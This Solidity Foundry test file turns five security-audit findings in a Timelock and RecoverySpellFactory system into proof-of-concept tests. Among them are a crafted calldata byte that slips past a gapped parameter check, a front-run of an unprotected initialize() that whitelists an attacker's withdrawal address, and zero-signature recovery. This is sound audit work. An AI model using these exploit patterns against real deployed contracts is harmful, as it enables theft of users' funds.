pragma solidity 0.8.25;

import "test/utils/TimelockUnitFixture.sol";
import {RecoverySpellFactory} from "src/RecoverySpellFactory.sol";
import {RecoverySpell} from "src/RecoverySpell.sol";

contract AuditFindingsTest is TimelockUnitFixture {
    RecoverySpellFactory rsFactory;

    function _initFactory() internal {
        rsFactory = new RecoverySpellFactory();
    }

    /// ---------------------------------------------------------------
    /// Finding 1: Off-by-one in _addCalldataCheck overlap validation
    /// Adjacent non-overlapping ranges [16,36) and [36,68) are rejected
    /// ---------------------------------------------------------------

    function testFinding1_AdjacentNonOverlappingRangesRejected() public {
        MockLending lending = new MockLending();

        // Add first check for address parameter at bytes [16, 36)
        bytes[] memory data1 = new bytes[](1);
        data1[0] = abi.encodePacked(address(timelock));
        vm.prank(address(timelock));
        timelock.addCalldataCheck(
            address(lending),
            MockLending.deposit.selector,
            16,
            36,
            data1
        );

        // Verify first check was added
        Timelock.IndexData[] memory checks = timelock.getCalldataChecks(
            address(lending), MockLending.deposit.selector
        );
        assertEq(checks.length, 1, "First check should be added");

        // Try to add adjacent check for uint256 parameter at bytes [36, 68)
        // These ranges are disjoint: [16,36) covers bytes 16-35, [36,68) covers bytes 36-67
        bytes[] memory data2 = new bytes[](1);
        data2[0] = abi.encodePacked(uint256(1000));
        vm.prank(address(timelock));
        vm.expectRevert("CalldataList: Partial check overlap");
        timelock.addCalldataCheck(
            address(lending),
            MockLending.deposit.selector,
            36,
            68,
            data2
        );
    }

    function testFinding1_GapWorkaroundLeavesByteUnchecked() public {
        MockLending lending = new MockLending();

        // Add check for address at [16, 36)
        bytes[] memory data1 = new bytes[](1);
        data1[0] = abi.encodePacked(address(timelock));
        vm.prank(address(timelock));
        timelock.addCalldataCheck(
            address(lending),
            MockLending.deposit.selector,
            16,
            36,
            data1
        );

        // Workaround: use [37, 68) instead of [36, 68), leaving byte 36 unchecked
        // For amount=1000 (0x...03E8), byte 36 is 0x00
        bytes memory amountBytes = abi.encode(uint256(1000));
        // Slice bytes 1..32 (skipping byte 0 which is byte 36 of the full calldata)
        bytes memory gapData = new bytes(31);
        for (uint256 i = 0; i < 31; i++) {
            gapData[i] = amountBytes[i + 1];
        }
        bytes[] memory data2 = new bytes[](1);
        data2[0] = gapData;
        vm.prank(address(timelock));
        timelock.addCalldataCheck(
            address(lending),
            MockLending.deposit.selector,
            37,
            68,
            data2
        );

        // Normal call with amount=1000 passes
        timelock.checkCalldata(
            address(lending),
            abi.encodeWithSelector(
                MockLending.deposit.selector, address(timelock), uint256(1000)
            )
        );

        // Crafted call: same bytes 37-67 but byte 36 set to 0x01
        // This changes the amount from 1000 to a much larger value
        bytes memory maliciousCalldata = abi.encodeWithSelector(
            MockLending.deposit.selector, address(timelock), uint256(1000)
        );
        // byte 36 in the calldata = byte 36 of full calldata (4 selector + 32 param1 = byte 36)
        maliciousCalldata[36] = 0x01;

        // The malicious calldata ALSO passes the check because byte 36 is unchecked
        timelock.checkCalldata(address(lending), maliciousCalldata);

        // Decode the manipulated amount
        uint256 manipulatedAmount;
        assembly {
            // Skip 4 bytes selector + 32 bytes address param, load uint256
            manipulatedAmount := mload(add(maliciousCalldata, 68))
        }

        // The manipulated amount is vastly different from 1000
        assertTrue(
            manipulatedAmount != 1000,
            "Amount should be different from intended"
        );
        assertTrue(
            manipulatedAmount > 1e50,
            "Manipulated amount should be astronomically large"
        );
    }

    /// ---------------------------------------------------------------
    /// Finding 2: RecoverySpellFactory transient storage not cleared
    /// ---------------------------------------------------------------

    function testFinding2_TransientStorageLeakBlocksBatchCreation() public {
        _initFactory();
        MockSafe mockSafe = new MockSafe();

        address[] memory owners1 = new address[](2);
        owners1[0] = address(0xA);
        owners1[1] = address(0xB);

        address[] memory owners2 = new address[](2);
        owners2[0] = address(0xA); // Same as in owners1
        owners2[1] = address(0xC);

        // First creation succeeds
        rsFactory.createRecoverySpell(
            bytes32(uint256(1)),
            owners1,
            address(mockSafe),
            1,
            1,
            1 days
        );

        // Second creation in the SAME transaction reverts
        // because tload(address(0xA)) returns 1 from the first call
        vm.expectRevert("RecoverySpell: Duplicate owner");
        rsFactory.createRecoverySpell(
            bytes32(uint256(2)),
            owners2,
            address(mockSafe),
            1,
            1,
            1 days
        );
    }

    function testFinding2_SeparateTransactionsWork() public {
        _initFactory();
        MockSafe mockSafe = new MockSafe();

        address[] memory owners1 = new address[](2);
        owners1[0] = address(0xA);
        owners1[1] = address(0xB);

        // First creation
        rsFactory.createRecoverySpell(
            bytes32(uint256(1)),
            owners1,
            address(mockSafe),
            1,
            1,
            1 days
        );

        // In a real chain, a separate transaction would clear transient storage.
        // We can't truly simulate that in a single test, but we demonstrate
        // the root cause: tstore values from the first call persist within the tx.

        // If we only use non-overlapping owners, it works in the same tx:
        address[] memory owners3 = new address[](2);
        owners3[0] = address(0xD);
        owners3[1] = address(0xE);

        // This succeeds because 0xD and 0xE were not in owners1
        rsFactory.createRecoverySpell(
            bytes32(uint256(3)),
            owners3,
            address(mockSafe),
            1,
            1,
            1 days
        );
    }

    /// ---------------------------------------------------------------
    /// Finding 3: RecoverySpellFactory allows SENTINEL address(1) as owner
    /// ---------------------------------------------------------------

    function testFinding3_SentinelOwnerDeploysSuccessfully() public {
        _initFactory();
        MockSafe mockSafe = new MockSafe();

        address[] memory owners = new address[](2);
        owners[0] = address(0xA);
        owners[1] = address(0x1); // SENTINEL_OWNERS in Safe

        // Factory allows address(1) — _paramChecks only checks address(0)
        RecoverySpell spell = rsFactory.createRecoverySpell(
            bytes32(uint256(99)),
            owners,
            address(mockSafe),
            1,
            1,
            1 days
        );

        // Spell deploys successfully
        assertTrue(
            address(spell) != address(0),
            "RecoverySpell should deploy"
        );
        assertTrue(
            address(spell).code.length > 0,
            "RecoverySpell should have code"
        );

        // Verify SENTINEL is stored as an owner
        address[] memory storedOwners = spell.getOwners();
        assertEq(storedOwners[1], address(0x1), "SENTINEL stored as owner");
    }

    /// ---------------------------------------------------------------
    /// Finding 4: Timelock initialize lacks access control
    /// ---------------------------------------------------------------

    function testFinding4_AnyoneCanCallInitialize() public {
        // Deploy a new timelock directly via factory
        Timelock newTimelock = Timelock(
            payable(
                timelockFactory.createTimelock(
                    address(safe),
                    DeploymentParams(
                        MINIMUM_DELAY,
                        EXPIRATION_PERIOD,
                        guardian,
                        PAUSE_DURATION,
                        hotSigners,
                        new address[](0),
                        new bytes4[](0),
                        new uint16[](0),
                        new uint16[](0),
                        new bytes[][](0),
                        keccak256("different-salt")
                    )
                )
            )
        );

        // Attacker front-runs initialize with malicious calldata checks
        address attacker = address(0xBEEF);
        MockLending lending = new MockLending();

        address[] memory targets = new address[](1);
        targets[0] = address(lending);
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = MockLending.withdraw.selector;
        uint16[] memory starts = new uint16[](1);
        starts[0] = 16;
        uint16[] memory ends = new uint16[](1);
        ends[0] = 36;
        bytes[][] memory datas = new bytes[][](1);
        datas[0] = new bytes[](1);
        datas[0][0] = abi.encodePacked(attacker); // whitelist attacker address

        // Attacker calls initialize — no access control, succeeds
        vm.prank(attacker);
        newTimelock.initialize(targets, selectors, starts, ends, datas);

        // Legitimate initialize call fails
        vm.expectRevert("Timelock: already initialized");
        newTimelock.initialize(
            new address[](0),
            new bytes4[](0),
            new uint16[](0),
            new uint16[](0),
            new bytes[][](0)
        );

        // Verify attacker's calldata check is in place
        Timelock.IndexData[] memory checks =
            newTimelock.getCalldataChecks(address(lending), MockLending.withdraw.selector);
        assertEq(checks.length, 1, "Attacker's check should be set");
        assertEq(
            checks[0].dataHashes[0],
            keccak256(abi.encodePacked(attacker)),
            "Attacker address whitelisted"
        );

        // Hot signer can now execute withdrawals to attacker address
        // checkCalldata passes for attacker destination
        newTimelock.checkCalldata(
            address(lending),
            abi.encodeWithSelector(
                MockLending.withdraw.selector, attacker, uint256(1e18)
            )
        );
    }

    /// ---------------------------------------------------------------
    /// Finding 5: RecoverySpellFactory allows recoveryThreshold=0
    /// ---------------------------------------------------------------

    function testFinding5_ZeroRecoveryThresholdAllowsUnauthorizedRecovery()
        public
    {
        _initFactory();
        MockSafe mockSafe = new MockSafe();

        address[] memory owners = new address[](2);
        owners[0] = address(0xA);
        owners[1] = address(0xB);

        // recoveryThreshold=0 is allowed — no validation against 0
        // (contrast: threshold=0 would revert with "Threshold must be gt 0")
        RecoverySpell spell = rsFactory.createRecoverySpell(
            bytes32(uint256(42)),
            owners,
            address(mockSafe),
            1, // threshold (must be > 0)
            0, // recoveryThreshold (0 accepted — no check!)
            1 days // delay
        );

        assertTrue(
            address(spell) != address(0),
            "RecoverySpell should deploy"
        );

        // Verify recoveryThreshold is 0
        assertEq(
            spell.recoveryThreshold(),
            0,
            "recoveryThreshold should be 0"
        );

        // After delay, anyone can call executeRecovery with ZERO signatures
        vm.warp(block.timestamp + 1 days + 1);

        // executeRecovery would succeed with empty signature arrays
        // (it reverts here only because mockSafe isn't a real Safe with modules)
        // The point: the signature check (recoveryThreshold <= v.length)
        // passes with 0 <= 0, and the signature loop doesn't execute
        uint8[] memory v = new uint8[](0);
        bytes32[] memory r = new bytes32[](0);
        bytes32[] memory s = new bytes32[](0);

        // This will get past all signature checks and only fail at the
        // Safe.execTransactionFromModule call because mockSafe doesn't support it
        vm.expectRevert();
        spell.executeRecovery(address(0x1), v, r, s);
    }

    function testFinding5_ThresholdZeroRevertsButRecoveryThresholdDoesNot()
        public
    {
        _initFactory();
        MockSafe mockSafe = new MockSafe();

        address[] memory owners = new address[](2);
        owners[0] = address(0xA);
        owners[1] = address(0xB);

        // threshold=0 correctly reverts
        vm.expectRevert("RecoverySpell: Threshold must be gt 0");
        rsFactory.createRecoverySpell(
            bytes32(uint256(43)),
            owners,
            address(mockSafe),
            0, // threshold — reverts
            1, // recoveryThreshold
            1 days
        );

        // recoveryThreshold=0 does NOT revert — asymmetric validation
        RecoverySpell spell = rsFactory.createRecoverySpell(
            bytes32(uint256(44)),
            owners,
            address(mockSafe),
            1, // threshold
            0, // recoveryThreshold — no revert
            1 days
        );

        assertTrue(
            address(spell) != address(0),
            "RecoverySpell with recoveryThreshold=0 deploys"
        );
    }
}
